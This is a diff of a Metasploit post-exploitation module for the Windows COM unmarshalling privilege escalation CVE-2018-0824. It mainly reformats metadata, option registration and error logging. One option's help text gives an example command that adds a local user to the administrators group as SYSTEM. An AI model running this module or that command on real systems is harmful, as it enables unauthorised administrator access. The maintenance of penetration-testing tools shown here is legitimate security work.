@@ -2,55 +2,51 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/post/common'
-require 'msf/core/post/file'
-require 'msf/core/post/windows/priv'
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Common
   include Msf::Post::File
-#  include Msf::Post::Windows::Priv
+  #  include Msf::Post::Windows::Priv
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Windows unmarshal post exploitation',
-      'Description' => %q{
-        This module exploits a local privilege escalation bug which exists
-        in microsoft COM for windows when it fails to properly handle serialized objects.},
-      'References'  =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows unmarshal post exploitation',
+        'Description' => %q{
+          This module exploits a local privilege escalation bug which exists
+          in microsoft COM for windows when it fails to properly handle serialized objects.
+        },
+        'References' => [
           ['CVE', '2018-0824'],
           ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0824'],
           ['URL', 'https://github.com/x73x61x6ex6ax61x79/UnmarshalPwn'],
           ['EDB', '44906']
         ],
-      'Author'      =>
-        [
+        'Author' => [
           'Nicolas Joly', # Vulnerability discovery
           'Matthias Kaiser', # Exploit PoC
           'Sanjay Gondaliya', # Modified PoC
           'Pratik Shah <pratik@notsosecure.com>' # Metasploit module
         ],
-      'DisclosureDate' => 'Aug 05 2018',
-      'Platform'       => ['win'],
-      'Targets'        =>
-        [
-          ['Windows x64', { 'Arch' => ARCH_X64 }]
-        ],
-      'License'        => MSF_LICENSE,
-    ))
+        'DisclosureDate' => '2018-08-05',
+        'Platform' => ['win'],
+        'Arch' => ARCH_X64,
+        'License' => MSF_LICENSE,
+      )
+    )
 
     register_options(
       [
-      OptString.new('COMMAND',
-        [false, 'The command to execute as SYSTEM (Can only be a cmd.exe builtin or Windows binary, (net user /add %RAND% %RAND% & net localgroup administrators /add <user>).', nil]),
-      OptString.new('EXPLOIT_NAME',
-        [false, 'The filename to use for the exploit binary (%RAND% by default).', nil]),
-      OptString.new('SCRIPT_NAME',
-        [false, 'The filename to use for the COM script file (%RAND% by default).', nil]),
-      OptString.new('PATH',
-        [false, 'Path to write binaries (%TEMP% by default).', nil]),
-      ])
+        OptString.new('COMMAND',
+                      [false, 'The command to execute as SYSTEM (Can only be a cmd.exe builtin or Windows binary, (net user /add %RAND% %RAND% & net localgroup administrators /add <user>).', nil]),
+        OptString.new('EXPLOIT_NAME',
+                      [false, 'The filename to use for the exploit binary (%RAND% by default).', nil]),
+        OptString.new('SCRIPT_NAME',
+                      [false, 'The filename to use for the COM script file (%RAND% by default).', nil]),
+        OptString.new('PATH',
+                      [false, 'Path to write binaries (%TEMP% by default).', nil]),
+      ]
+    )
   end
 
   def setup
@@ -79,7 +75,7 @@ class MetasploitModule < Msf::Post
     begin
       print_status("Attempting to Run on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
     rescue Rex::Post::Meterpreter::RequestError => e
-      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+      elog(e)
       raise Msf::Exploit::Failed, 'Could not connect to session'
     end
   end
@@ -106,7 +102,7 @@ class MetasploitModule < Msf::Post
         file_rm(path)
         print_status("Deleted #{path}")
       rescue Rex::Post::Meterpreter::RequestError => e
-        elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+        elog(e)
         print_error("Unable to delete #{path}")
       end
     end
@@ -160,7 +156,7 @@ class MetasploitModule < Msf::Post
       ensure_clean_destination(exploit_path)
       ensure_clean_destination(script_path)
     rescue Rex::Post::Meterpreter::RequestError => e
-      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+      elog('Command failed, cleaning up', error: e)
       print_good('Command failed, cleaning up')
       print_error(e.message)
       ensure_clean_destination(exploit_path)
@@ -173,4 +169,3 @@ class MetasploitModule < Msf::Post
   attr_reader :exploit_path
   attr_reader :script_path
 end
-
